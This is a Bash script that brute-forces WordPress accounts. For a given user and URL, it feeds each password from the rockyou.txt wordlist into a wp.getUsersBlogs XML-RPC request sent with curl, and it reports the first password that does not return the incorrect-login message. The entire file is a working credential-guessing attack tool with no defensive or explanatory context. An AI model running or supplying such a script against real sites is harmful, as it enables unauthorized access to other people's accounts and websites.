#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

endColour="\033[0m\e[0m"

# Function for Control_c
function ctrl_c(){
    echo -e "\n\n [!] Saliendo...\n"
    exit 1
}

# ctrl_c
trap ctrl_c SIGINT

# Validate the number of arguments
if [ $# -ne 2 ]; then
    echo "Error: 2 arguments are required."
    echo "Uso: $0 USER URL"
    exit 1
fi

# This function is used to create the xml file and make the request for the brute force attack
function createXML(){
    # Variables
    password=$1
    user=$2
    url=$3
    
    # xml File
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
    """

    # We make the request with curl passing the xml file
    echo $xmlFile > file.xml
    # We store the response in a variable to later print the password when it is valid
    response=$(curl -s -X POST $url -d@file.xml)
    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "La contrase√±a para el usuario $greenColour$user$endColour es: $greenColour$password$endColour"
        exit 0
    fi
}

user=$1
url=$2
# We read the dictionary and make the conditional by calling the function
cat /usr/share/wordlists/rockyou.txt | while read password; do
    createXML $password $user $url
done
